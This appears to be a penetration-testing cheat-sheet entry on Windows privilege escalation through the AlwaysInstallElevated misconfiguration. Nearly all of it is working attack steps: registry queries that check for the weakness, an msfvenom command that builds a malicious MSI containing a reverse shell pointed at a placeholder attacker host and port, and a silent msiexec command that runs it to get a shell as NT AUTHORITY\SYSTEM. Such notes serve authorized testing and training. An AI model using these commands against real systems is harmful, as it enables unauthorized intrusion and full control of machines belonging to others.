# AlwaysInstallElevated MSI

Any user can install .msi packages as SYSTEM when both registry keys are set.

**Check:**
```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
Both must be `0x1`. WinPEAS also detects this.

**Generate malicious MSI:**
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f msi -o rev.msi
```

**Execute on target:**
```cmd
msiexec /quiet /qn /i rev.msi
```
Shell returns as `NT AUTHORITY\SYSTEM`.
